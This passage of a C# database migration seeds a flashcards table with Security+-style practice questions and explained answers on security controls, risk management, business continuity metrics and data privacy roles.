                values: new object[] { 803, "\r\n28. D. A backup generator is a compensating control—an alternate\r\ncontrol that replaces the original control when it cannot be used\r\ndue to limitations of the environment. A firewall is considered a\r\npreventive control, a security guard is considered a physical\r\ncontrol, and an IDS (intrusion detection system) is considered a\r\ndetective control.\r\n", 5, "\r\n28. You are the network administrator of your company, and the manager of a retail site located\r\nacross town has complained about the loss of power to their building several times this year.\r\nThe branch manager is asking for a compensating control to overcome the power outage.\r\nWhat compensating control would you recommend?\r\nA. Firewall\r\nB. Security guard\r\nC. IDS\r\nD. Backup generator\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 805, "\r\n30. C. Job rotation allows individuals to see various parts of the\r\norganization and how it operates. It also eliminates the need for\r\na company to rely on one individual for security expertise should\r\nthe employee become disgruntled and decide to harm the\r\ncompany.\r\nRecovering from a disgruntled employee’s attack is easier when\r\nmultiple employees understand the company’s security posture.\r\nSeparation of duties is the concept of having more than one\r\nperson required to complete a task, allowing problems to be\r\nnoted by others involved. A mandatory vacation policy is used by\r\ncompanies to detect fraud by having a second person, familiar\r\nwith the duties, help discover any illicit activities while the\r\nperson who normally performs them is out of the office.\r\nOnboarding is the process of adding an employee to a company’s\r\nidentity and access management system or other infrastructure.\r\n", 5, "\r\n30. An accounting employee changes roles with another accounting employee every 4 months.\r\nWhat is this an example of?\r\nA. Separation of duties\r\nB. Mandatory vacation\r\nC. Job rotation\r\nD. Onboarding\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 806, "\r\n31. B. Data minimization is the process of ensuring that only data\r\nthat is required for business functions is collected and\r\nmaintained. Tony should ensure that his organization is\r\nminimizing the data collected. Data masking redacts data but\r\ndoes not decrease how much is collected. Tokenization replaces\r\nsensitive values with a unique identifier that can be looked up in\r\na lookup table. Anonymization removes the ability to identify\r\nindividuals from data but is quite difficult.\r\n", 5, "\r\n31. Tony’s company wants to limit their risk due to customer data. What practice should they\r\nput in place to ensure that they have only the data needed for their business purposes?\r\nA. Data masking\r\nB. Data minimization\r\nC. Tokenization\r\nD. Anonymization\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 807, "\r\n32. A. Risk avoidance is a strategy to deflect threats in order to\r\navoid the costly and disruptive consequences of a damaging\r\nevent. It also attempts to minimize vulnerabilities that can pose\r\na threat. A risk register is a document that tracks an\r\norganization’s risks and information about the risks like who\r\nowns it, if it is being remediated, and similar details. Risk\r\nacceptance is a strategy of recognizing, identifying, and\r\naccepting a risk that is sufficiently unlikely or that has such\r\nlimited impact that a corrective control is not warranted. Risk\r\nmitigation is when a company implements controls to reduce\r\nvulnerabilities or weaknesses in a system. It can also reduce the\r\nimpact of a threat.\r\n", 5, "\r\n32. Your company website is hosted by an Internet service provider. Which of the following risk\r\nresponse techniques is in use?\r\nA. Risk avoidance\r\nB. Risk register\r\nC. Risk acceptance\r\nD. Risk mitigation\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 808, "\r\n33. D. Systems should be restored within four hours with a\r\nminimum loss of one day’s worth of data. The RTO (recovery\r\ntime objective) is the amount of time within which a process or\r\nservice must be restored after a disaster to meet business\r\ncontinuity. It defines how much time it takes to recover after\r\nnotification of process disruption. The recovery point objective,\r\nor RPO, specifies the amount of time that can pass before the\r\namount of data lost may exceed the organization’s maximum\r\ntolerance for data loss.\r\n", 5, "\r\n33. A security administrator is reviewing the company’s continuity plan, and it specifies an RTO\r\nof four hours and an RPO of one day. Which of the following is the plan describing?\r\nA. Systems should be restored within one day and should remain operational for at least\r\nfour hours.\r\nB. Systems should be restored within four hours and no later than one day after the incident.\r\nC. Systems should be restored within one day and lose, at most, four hours’ worth of data.\r\nD. Systems should be restored within four hours with a loss of one day’s worth of data at\r\nmost.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 809, "\r\n34. A. A data retention policy defines how long an organization will\r\nkeep data. Removing sensitive documents not in use is a clean\r\ndesk policy. A formal process for managing configuration\r\nchanges is change management, and a memorandum of\r\nunderstanding consists of legal documents that describe mutual\r\nagreement between two parties.\r\n", 5, "\r\n34. Which of the following statements is true regarding a data retention policy?\r\nA. Regulations require financial transactions to be stored for seven years.\r\nB. Employees must remove and lock up all sensitive and confidential documents when not\r\nin use.\r\nC. It describes a formal process of managing configuration changes made to a network.\r\nD. It is a legal document that describes a mutual agreement between parties.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 810, "\r\n35. B. ALE (annual loss expectancy) is the product of the ARO\r\n(annual rate of occurrence) and the SLE (single loss expectancy)\r\nand is mathematically expressed as ALE = ARO × SLE. Single\r\nloss expectancy is the cost of any single loss, and it is\r\nmathematically expressed as SLE = AV (asset value) × EF\r\n(exposure factor).\r\n", 5, "\r\n35. How do you calculate the annual loss expectancy (ALE) that may occur due to a threat?\r\nA. Exposure factor (EF) / single loss expectancy (SLE)\r\nB. Single loss expectancy (SLE) × annual rate of occurrence (ARO)\r\nC. Asset value (AV) × exposure factor (EF)\r\nD. Single loss expectancy (SLE) / exposure factor (EF)\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 811, "\r\n36. B. The Center for Internet Security (CIS) benchmarks provide\r\nrecommendations for how to secure an operating system,\r\napplication, or other covered technology. Michelle will find\r\nWindows 10–specific security configuration guidelines and\r\ntechniques.\r\n", 5, "\r\n36. Michelle has been asked to use the CIS benchmark for Windows 10 as part of her system\r\nsecurity process. What information will she be using?\r\nA. Information on how secure Windows 10 is in its default state\r\nB. A set of recommended security configurations to secure Windows 10\r\nC. Performance benchmark tools for Windows 10 systems, including network speed and\r\nfirewall throughput\r\nD. Vulnerability scan data for Windows 10 systems provided by various manufacturers\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 812, "\r\n37. A. Preventive controls like data backups are proactive and are\r\nused to avoid a security breach or an interruption of critical\r\nservices before they can happen. Security cameras, smoke\r\ndetectors, and door alarms are examples of detective control.\r\nDetective controls detect intrusion as it happens and uncovers a\r\nviolation.\r\n", 5, "\r\n37. Which of the following is the best example of a preventive control?\r\nA. Data backups\r\nB. Security camera\r\nC. Door alarm\r\nD. Smoke detectors\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 813, "\r\n38. C. Risk transfer is the act of moving the risk to hosted providers\r\nwho assume the responsibility for recovery and restoration or by\r\nacquiring insurance to cover the costs emerging from a risk. Risk\r\nacceptance is a strategy of recognizing, identifying, and\r\naccepting a risk that is sufficiently unlikely or that has such\r\nlimited impact that a corrective control is not warranted. Risk\r\nmitigation is when a company implements controls to reduce\r\nvulnerabilities or weaknesses in a system. It can also reduce the\r\nimpact of a threat. Risk avoidance is the removal of the\r\nvulnerability that can increase a particular risk so that it is\r\navoided altogether.\r\n", 5, "\r\n38. You are a security administrator for your company and you identify a security risk that you\r\ndo not have in-house skills to address. You decide to acquire contract resources. The contractor\r\nwill be responsible for handling and managing this security risk. Which of the following\r\ntype of risk response techniques are you demonstrating?\r\nA. Accept\r\nB. Mitigate\r\nC. Transfer\r\nD. Avoid\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 814, "\r\n39. D. A preventive control is used to avoid a security breach or an\r\ninterruption of critical services before they can happen.\r\nAdministrative controls are defined through policies,\r\nprocedures, and guidelines. A compensating control is used to\r\nsatisfy a requirement for a security measure that is too difficult\r\nor impractical to implement at the current time. A deterrent\r\ncontrol is used to deter a security breach.\r\n", 5, "\r\n39. Each salesperson who travels has a cable lock to lock down their laptop when they step away\r\nfrom the device. To which of the following controls does this apply?\r\nA. Administrative\r\nB. Compensating\r\nC. Deterrent\r\nD. Preventive\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 815, "\r\n40. C. Mean time between failures (MTBF) is a measurement to\r\nshow how reliable a hardware component is. MTTR (mean time\r\nto repair) is the average time it takes for a failed device or\r\ncomponent to be repaired or replaced. An RPO (recovery point\r\nobjective) is the period of time a company can tolerate lost data\r\nbeing unrecoverable between backups. ALE (annual loss\r\nexpectancy) is the product of the annual rate of occurrence\r\n(ARO) and the single loss expectancy (SLE).\r\n", 5, "\r\n40. You are a server administrator for your company’s private cloud. To provide service to\r\nemployees, you are instructed to use reliable hard disks in the server to host a virtual environment.\r\nWhich of the following best describes the reliability of hard drives?\r\nA. MTTR\r\nB. RPO\r\nC. MTBF\r\nD. ALE\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 804, "\r\n29. A. Preventive controls stop an action from happening—in this\r\nscenario, preventing an unauthorized user from gaining access\r\nto the network when the user steps away. A corrective control is\r\ndesigned to correct a situation, a deterrent control is used to\r\ndeter a security breach, and a detective control is designed to\r\nuncover a violation.\r\n", 5, "\r\n29. James is a security administrator and is attempting to block unauthorized access to the\r\ndesktop computers within the company’s network. He has configured the computers’\r\noperating systems to lock after 5 minutes of no activity. What type of security control has\r\nJames implemented?\r\nA. Preventive\r\nB. Corrective\r\nC. Deterrent\r\nD. Detective\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 845, "\r\n70. D. The diagram shows a fully redundant internal network with\r\npairs of firewalls, routers, and core switches, but with a single\r\nconnection to the Internet. This means that Megan should\r\nconsider how her organization would connect to the outside\r\nworld if that link was severed or disrupted. There is no\r\nindication whether this is a wired or wireless link, and the image\r\ndoes not show a redundant link.\r\n", 5, "\r\n70. Megan is reviewing her organization’s datacenter network diagram as shown in the following\r\nimage. What should she note for point A on the diagram?\r\nInternet\r\nService\r\nProvider\r\nInternet\r\nPoint A\r\nPoint B Firewalls\r\nRouters\r\nCore\r\nSwitches\r\nEdge\r\nSwitches\r\nPoint D\r\nPoint C\r\nA. A wireless link\r\nB. A redundant connection\r\nC. A wired link\r\nD. A single point of failure\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 846, "\r\n71. D. Emma should categorize this as a supply chain risk. When\r\norganizations cannot get the systems, equipment, and supplies\r\nthey need to operate, it can have significant impact on their\r\nability to conduct business. That could create financial risk, but\r\nfinancial risk is not the direct risk here. There is no indication\r\nthat the vendor will not support the systems, nor is there any\r\ninformation about whether there is an integration issue in the\r\ndescription.\r\n", 5, "\r\n71. Emma is reviewing third-party risks to her organization, and Nate, her organization’s procurement\r\nofficer, notes that purchases of some laptops from the company’s hardware vendor\r\nhave been delayed due to lack of availability of SSDs (solid state drives) and specific CPUs\r\nfor specific configurations. What type of risk should Emma describe this as?\r\nA. Financial risk\r\nB. A lack of vendor support\r\nC. System integration\r\nD. Supply chain\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 847, "\r\n72. A. An intrusion detection system (IDS) can detect attacks, and\r\nis a detective control. Since it is a technical system rather than a\r\nphysical control or an administrative policy or procedure, Henry\r\ncan correctly categorize it as a technical, detective control.\r\n", 5, "\r\n72. Henry has implemented an intrusion detection system. What category and control type could\r\nhe list for an IDS?\r\nA. Technical, Detective\r\nB. Administrative, Preventative\r\nC. Technical, Corrective\r\nD. Administrative, Detective\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 877, "\r\n102. D. Inherent risk is the risk that an organization faces before\r\ncontrols are put in place. Without risk assessment and controls\r\nin place, Gary must first deal with the inherent risks the\r\norganization has as it exists today. Residual risk is the risk that\r\nis left after controls are put in place. The theft of intellectual\r\nproperty (IP) like algorithms, formulas, and processes are IP\r\nrisks, and multiparty risk is risk that impacts more than one\r\ngroup, company, or person.\r\n", 5, "\r\n102. Gary is beginning his risk assessment for the organization and has not yet begun to implement\r\ncontrols. What risk does his organization face?\r\nA. Residual risk\r\nB. IP theft risk\r\nC. Multiparty risk\r\nD. Inherent risk\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 878, "\r\n103. A. The single loss expectancy (SLE) describes what a single risk\r\nevent is likely to cost. It is calculated using the asset value (AV)\r\ntimes the exposure factor (EF), which is an estimated percentage\r\nof the cost that will occur in damage if the loss occurs. MTTR is\r\nthe mean time to restore, ARO is the annual rate of occurrence,\r\nand RTO is the recovery time objective. These are not part of the\r\nSLE equation.\r\n", 5, "\r\n103. How is SLE calculated?\r\nA. AV * EF\r\nB. RTO * AV\r\nC. MTTR * EF\r\nD. AV * ARO\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 879, "\r\n104. C. Third-party credential policies address how contractors and\r\nconsultants credentials are handled. This may require\r\nsponsorship by an internal staff member, additional controls\r\nregarding password resets or changes, and shorter lifespans,\r\namong other controls and requirements.\r\n", 5, "\r\n104. What type of credential policy is typically created to handle contractors and consultants?\r\nA. A personnel policy\r\nB. A service account policy\r\nC. A third-party policy\r\nD. A root account policy\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 880, "\r\n105. B. Annual rate of occurrence (ARO) is expressed as the number\r\nof times an event will occur in a year. Wayne has estimated that\r\nthe risk event that is being assessed will happen three times a\r\nyear.\r\n", 5, "\r\n105. Wayne has estimated the ARO for a risk in his organization to be 3. How often does Wayne\r\nthink the event will happen?\r\nA. Once every 3 months\r\nB. Three times a year\r\nC. Once every three years\r\nD. Once a year for three years\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 881, "\r\n106. D. Although humans can create fires or floods, industrial\r\naccidents are the only item on the list that are exclusively\r\nperson-made disasters.\r\n", 5, "\r\n106. Gurvinder is assessing risks from disasters to his company’s facility and wants to properly\r\ncategorize them in his planning. Which of the following is not a type of natural disaster?\r\nA. Fire\r\nB. Flood\r\nC. Tornado\r\nD. Industrial accidents\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 882, "\r\n107. C. Information on a website made available to customers is\r\ntypically classified as public information because it is easily\r\navailable and intentionally exposed to them. Confidential,\r\nsensitive, or critical information is unlikely to be exposed to\r\ncustomers without a specific data handling agreement and\r\nadditional security layers.\r\n", 5, "\r\n107. Madhuri is classifying all of her organization’s data and wants to properly classify the\r\ninformation on the main organizational website that is available to anyone who visits the\r\nsite. What data classification should she use from the following list?\r\nA. Sensitive\r\nB. Confidential\r\nC. Public\r\nD. Critical\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 883, "\r\n108. D. Data processors are service providers that process data for\r\ndata controllers. A data controller or data owner is the\r\norganization or individual who collects and controls data. A data\r\nsteward carries out the intent of the data controller and is\r\ndelegated responsibility for the data. Data custodians are those\r\nwho are entrusted with the data to store, manage, or secure the\r\ndata.\r\n", 5, "\r\n108. Elle works for a credit card company that handles credit card transactions for businesses\r\naround the world. What data privacy role does her company play?\r\nA. A data controller\r\nB. A data steward\r\nC. A data custodian\r\nD. A data processor\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 884, "\r\n109. D. Data masking partially redacts sensitive data by replacing\r\nsome or all information in a sensitive data field with blanks or\r\nother replacement characters. Tokenization replaces sensitive\r\ndata with unique identifiers using a lookup table. Hashing\r\nperforms a one-way function on a value to get a unique hash,\r\nand encryption protects data using an algorithm that can be\r\nreversed to restore the original data while allowing for\r\nconfidentiality and integrity validation.\r\n", 5, "\r\n109. The website that Brian is using shows part of his Social Security number, not all of it, and\r\nreplacing the rest of the digits with asterisks, allowing him to verify the last four digits.\r\nWhat technique is in use on the website?\r\nA. Tokenization\r\nB. Hashing\r\nC. Encryption\r\nD. Data masking\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 885, "\r\n110. C. The Cloud Security Alliance’s reference architecture includes\r\ninformation about tools in a vendor-neutral manner. CIS\r\nprovides vendor specific benchmarks for AWS, Azure, and\r\nOracle’s cloud offerings. The International Organization for\r\nStandardization (ISO) and the National Institute of Standards\r\nand Technology (NIST) do not offer this type of resource.\r\n", 5, "\r\n110. Mike wants to look for a common set of tools for security and risk management for his\r\ninfrastructure as a service (IaaS) environment. Which of the following organizations provides\r\na vendor-neutral reference architecture that he can use to validate his design?\r\nA. The Center for Internet Security (CIS)\r\nB. ISO\r\nC. The Cloud Security Alliance\r\nD. NIST\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 886, "\r\n111. C. Locks are physical controls. An example of a managerial\r\ncontrol would be a policy or practice, a technical control can\r\ninclude things like firewalls or antivirus, and corrective controls\r\nare put in place to ensure that a problem or gap in another\r\ncontrol is fixed.\r\n", 5, "\r\n111. What type of control is a lock?\r\nA. Managerial\r\nB. Technical\r\nC. Physical\r\nD. Corrective\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 887, "\r\n112. C. Control risk is a term used in public accounting. It is the risk\r\nthat arises from a potential lack of internal controls within an\r\norganization that may cause a material misstatement in the\r\norganization’s financial reports. In this case, the lack of controls\r\nthat would validate the financial system’s data and function is a\r\ncontrol risk.\r\n", 5, "\r\n112. Isaac has discovered that his organization’s financial accounting software is misconfigured,\r\ncausing incorrect data to be reported on an ongoing basis. What type of risk is this?\r\nA. Inherent risk\r\nB. Residual risk\r\nC. Control risk\r\nD. Transparent risk\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 876, "\r\n101. D. The most accurate risk descriptor for this is software\r\ncompliance. Although this is an internal risk, software\r\ncompliance fully describes the issue. Intellectual property (IP)\r\ntheft risk occurs when an organization’s intellectual property is\r\nstolen, not when license violations for third parties occurs. This\r\nis not a legacy system, or at least it was not described that way in\r\nthe question.\r\n", 5, "\r\n101. After reviewing systems on his network, Brian has discovered that dozens of them are\r\nrunning copies of a CAD software package that the company has not paid for. What risk\r\ntype should he identify this as?\r\nA. Internal\r\nB. Legacy systems\r\nC. IP theft\r\nD. Software compliance\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 888, "\r\n113. C. Although fires, oil spills, and wars are all potential examples\r\nof person-made disasters, hurricanes remain solely a natural\r\ndisaster. Some disasters could be either a person-made or\r\nnatural disaster. For example, fires can be caused by humans or\r\nby nature, as can floods, and even chemical spills when an\r\nearthquake occurs.\r\n", 5, "\r\n113. Which of the following is not a potential type of person-made disaster?\r\nA. Fires\r\nB. Oil spills\r\nC. Hurricanes\r\nD. War\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 890, "\r\n115. C. Phone numbers uniquely identify individuals, making them\r\nan example of personally identifiable information, or PII. PHI is\r\nprotected health information, financial information includes\r\nfinancial records of all types, and government information is\r\ninformation that belongs to the government or may be classified\r\nby the government and entrusted to an organization.\r\n", 5, "\r\n115. Ed serves as his organization’s data steward and wants to classify each data element that is\r\nused in their business. How should he classify cell phone numbers?\r\nA. As PHI\r\nB. As financial information\r\nC. As PII\r\nD. As government information\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 891, "\r\n116. B. Tokenization is an ideal option for this scenario.\r\nTokenization replaces a sensitive value with an alternate value\r\nthat can be looked up in a table when the value needs to be\r\nreferenced back to its original form. Encryption does not meet\r\nthis need, data masking only hides part of the value, and data\r\nwashing is not a commonly used term for techniques of this\r\nnature.\r\n", 5, "\r\n116. Marcus wants to ensure that attackers can’t identify his customers if they were to gain\r\na copy of his organization’s web application database. He wants to protect their Social\r\nSecurity numbers (SSNs) with an alternate value that he can reference elsewhere when he\r\nneeds to look up a customer by their SSN. What technique should he use to accomplish this?\r\nA. Encryption\r\nB. Tokenization\r\nC. Data masking\r\nD. Data washing\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 892, "\r\n117. C. Privacy notices are often included on websites to meet the\r\nrequirements of laws or regulations like the General Data\r\nProtection Regulation (GDPR) or state privacy laws.\r\n", 5, "\r\n117. Which of the following is the most common reason to include a privacy notice on a website?\r\nA. To warn attackers about security measures\r\nB. To avoid lawsuits\r\nC. Due to regulations or laws\r\nD. None of the above\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 893, "\r\n118. C. Nicole is a data controller, sometimes called a data owner.\r\nShe determines the reasons for processing personal information\r\nand how it is processed. A data steward carries out the intents of\r\nthe data controller, data custodians are charged with\r\nsafeguarding information, and data consumer is not a common\r\ndata privacy role.\r\n", 5, "\r\n118. Nicole determines how her organization processes data that it collects about its customers\r\nand also decides how and why personal information should be processed. What role does\r\nNicole play in her organization?\r\nA. Data steward\r\nB. Data custodian\r\nC. Data controller\r\nD. Data consumer\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 894, "\r\n119. B. This is an internal disaster—one in which internal issues\r\nhave led to a problem. An external disaster would be caused by\r\nforces outside the organization like a natural disaster, malicious\r\nactivity, or other outside forces. An RTO, or recovery time\r\nobjective, is not a type of disaster, and an MRO disaster was\r\nmade up for this question.\r\n", 5, "\r\n119. The virtual machine cluster that Pat is in charge of has suffered a major failure in its primary\r\ncontroller. The entire organization is offline, and customers cannot get to the organization’s\r\nwebsite which is its primary business. What type of disaster has Pat’s organization\r\nexperienced?\r\nA. An MRO disaster\r\nB. An internal disaster\r\nC. An RTO disaster\r\nD. An external disaster\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 895, "\r\n120. C. Minimizing the amount of data that is collected is the first\r\nstep in ensuring that organizations can handle the volume and\r\ntypes of data that they work with. After that, classifying it and\r\nthen determining how long you retain it are also important parts\r\nof the data life cycle.\r\n", 5, "\r\n120. What important step should be taken early in the information life cycle to ensure that organizations\r\ncan handle the data they collect?\r\nA. Data retention\r\nB. Data classification\r\nC. Data minimization\r\nD. Data exfiltration\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 896, "\r\n121. D. Kirk has mitigated the risk to his organization by increasing\r\nthe resources targeted by the DoS attack in an attempt to ensure\r\nthat the attack will not be successful. Acceptance would involve\r\nsimply letting the attacks occur knowing they are likely to stop,\r\navoidance might involve finding a way to ensure the attacks\r\ncannot occur, and transfer could leverage a third-party mirror or\r\nanti-DoS hosting service.\r\n", 5, "\r\n121. Kirk’s organization has been experiencing large-scale denial-of-service (DoS) attacks against\r\ntheir primary website. Kirk contracts with his Internet service provider to increase the organization’s\r\nbandwidth and expands the server pool for the website to handle significantly\r\nmore traffic than any of the previous DoS attacks. What type of risk management strategy\r\nhas he employed?\r\nA. Acceptance\r\nB. Avoidance\r\nC. Transfer\r\nD. Mitigation\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 897, "\r\n122. A. A multiparty risk involves multiple organizations. Since\r\nthere are multiple customers and organizations involved, this is\r\nan example of multiparty risk. An internal risk originates inside\r\nan organization—instead, this is an external risk. A legacy\r\nsystem risk is created by a system or process that is no longer\r\nsupported or updated. An intellectual property (IP) theft risk\r\noccurs when proprietary information or trade secrets might be\r\nexposed or lost.\r\n", 5, "\r\n122. The co-location facility that Joanna contracts to host her organization’s servers is in a flood\r\nplain in a hurricane zone. What type of risk best describes the risk that Joanna and other\r\ncustomers face?\r\nA. A multiparty risk\r\nB. An internal risk\r\nC. A legacy risk\r\nD. An IP theft risk\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 898, "\r\n123. B. EOL, or end of life, occurs when a service or system is no\r\nlonger supported, available, or does not function. Natasha needs\r\nto plan to transition smoothly away from the service, either to a\r\nreplacement service or to stop using the service itself. An MOU\r\nis a memorandum of understanding, and an NDA is a\r\nnondisclosure agreement, neither of which is directly relevant\r\nhere. A last will and testament is not used for a service EOL.\r\n", 5, "\r\n123. The cloud service that Natasha’s organization has used for the past five years will no\r\nlonger be available. What phase of the vendor relationship should Natasha plan for with\r\nthis service?\r\nA. Preparing a service MOU\r\nB. An EOL transition process\r\nC. Creating an NDA\r\nD. A last will and testament\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 899, "\r\n124. C. The Center for Internet Security (CIS) provides a wide range\r\nof OS, application, server, and other benchmarks. Microsoft\r\nprovides benchmarks for their own operating systems but does\r\nnot provide Linux benchmarks. The National Institute of\r\nStandards and Technology (NIST) does not provide\r\nbenchmarks, but the National Security Agency (NSA) does.\r\n", 5, "\r\n124. Gary wants to use a secure configuration benchmark for his organization for Linux. Which\r\nof the following organizations would provide a useful, commonly adopted benchmark that\r\nhe could use?\r\nA. Microsoft\r\nB. NIST\r\nC. CIS\r\nD. All of the above\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 900, "\r\n125. C. Offboarding processes are conducted to ensure that accounts\r\nand access is removed and that materials, computers, and data\r\nare all recovered from the staff member when a member of an\r\norganization leaves. Exit interviews are an HR process, job\r\nrotation helps to prevent an individual from conducting\r\nfraudulent activities over time, and governance helps to manage\r\nand maintain data by establishing high level control over the\r\nprocesses, procedures, and classification of the data an\r\norganization uses.\r\n", 5, "\r\n125. After Angela left her last organization, she discovered that she still had access to her shared\r\ndrives and could log in to her email account. What critical process was likely forgotten\r\nwhen she left?\r\nA. An exit interview\r\nB. Job rotation\r\nC. Offboarding\r\nD. Governance\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 889, "\r\n114. C. Confidential information is classified by the U.S.\r\ngovernment as information that requires some protection and\r\nthat if disclosed without authorization, would cause identifiable\r\nharm to national security. Top Secret information requires the\r\nhighest degree of protection and would cause exceptionally\r\ngrave harm if exposed without authorization. Secret information\r\nrequires a substantial degree of protection and would cause\r\nserious damage if exposed. Business Sensitive is not a U.S.\r\ngovernment classification but is a term commonly used in\r\nbusinesses.\r\n", 5, "\r\n114. Susan works for the U.S. government and has identified information in her organization that\r\nrequires some protection. If the information were disclosed without authorization, it would\r\ncause identifiable harm to national security. How should she classify the data?\r\nA. Top Secret\r\nB. Secret\r\nC. Confidential\r\nD. Business Sensitive\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 875, "\r\n100. B. Olivia should establish a service level agreement (SLA) with\r\nher provider to ensure that they meet the expected level of\r\nservice. If they don’t, financial or other penalties are typically\r\nincluded. Olivia should ensure that those penalties are\r\nmeaningful to her vendor to make sure they are motivated to\r\nmeet the SLA. An MOU is a memorandum of understanding and\r\nexplains the relationship between two organizations; an MSA is\r\na master services agreement, which establishes a business\r\nrelationship under which additional work orders or other\r\ndocumentation describe the actual work that is done; and a BPA\r\nis a business partnership agreement, which is used when\r\ncompanies wish to partner on efforts and may outline division of\r\nprofits or responsibilities in the partnership.\r\n", 5, "\r\n100. Olivia’s cloud service provider claims to provide “five nines of uptime” and Olivia’s\r\ncompany wants to take advantage of that service because their website loses thousands of\r\ndollars every hour that it is down. What business agreement can Oliva put in place to help\r\nensure that the reliability that the vendor advertises is maintained?\r\nA. An MOU\r\nB. An SLA\r\nC. An MSA\r\nD. A BPA\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
